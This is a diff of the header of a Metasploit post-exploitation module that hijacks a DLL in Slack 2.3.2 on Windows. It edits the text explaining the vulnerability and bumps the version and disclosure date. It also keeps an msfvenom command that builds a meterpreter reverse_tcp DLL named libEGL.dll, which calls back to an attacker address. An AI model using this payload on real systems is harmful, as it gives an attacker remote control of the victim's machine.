@@ -9,36 +9,25 @@
 ##
 # Exploit Title  : slack_dll_hijack.rb
 # Module Author  : pedr0 Ubuntu [r00t-3xp10it]
-# slack Version  : 2.3.2
-# vuln Discover  : Chaitanya Haritash
+# Slack Version  : 2.3.2
+# Vuln Discover  : Chaitanya Haritash
 # Tested on      : Windows 7 ultimate (32 bites)
 # Software Link  : http://www.techspot.com/downloads/6754-slack.html
 #
 #
-# [ SOFTWARE DETAILS ]
-# slack 2.3.2 - Real-time messaging that works. Get full access to your messages and archives,
-# upload files easily, and receive notifications whether you’re at your desk or on the go.
-# slack 2.3.2 its affected by dll hijacking method.
+# [ VULNERABILITY DETAILS ]
+# DLL Hijacking is when you abuse the library search order to gain execution in a process. Being
+# able to write to the directory an executable resides in allows a malicious actor the ability to
+# drop a dll with the same name as one the executable will request via LoadLibrary. When the
+# executable attempts to load the expected library, they will instead load the malicious dll.
 #
-# [ ATTACK DETAILS ]
-# Depending on the configuration of the system, a program can decide the order of the directories
-# to be searched for a DLL to load. By default the order of this search is as follows:
-#
-# 1 - The directory from which the application is loaded
-# 2 - The current directory
-# 3 - The system directory, usually C:\\Windows\\System32\\
-# 4 - The 16-bit system directory - There is no dedicated function to retrieve the path of this directory.
-# 5 - The Windows directory. The GetWindowsDirector function is called to obtain this directory.
-# 6 - The directories that are listed in the PATH environment variable.
-#
-# In this case, the current directory is the problem. When a program makes a decision
-# to load a DLL from the current directory, it can lead to the DLL hijacking. To exploit
-# this vulnerability a local attacker can insert an executable file in the path of the service.
+# "In this case the current directory and PATH environment are the problem, When a program makes the
+# decision to load a DLL from the current directory, it can lead to DLL hijacking"(not dll injection)
 #
 #
-# [ BUILD MALICIOUS DLL ]
+#
+# [ BUILD MALICIOUS DLL FOR TESTING ]
 # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=1337 -a x86 --platform windows -f dll -o libEGL.dll
-#
 #
 # [ MODULE DEFAULT OPTIONS ]
 # The session number to run this module on        => set SESSION 3
@@ -104,8 +93,8 @@ class MetasploitModule < Msf::Post
                                         'Vuln discover : Chaitanya Haritash', # vuln discover
                                 ],
  
-                        'Version'        => '$Revision: 1.1',
-                        'DisclosureDate' => 'dez 1 2016',
+                        'Version'        => '$Revision: 1.2',
+                        'DisclosureDate' => 'dez 2 2016',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'false', # thats no need for privilege escalation..
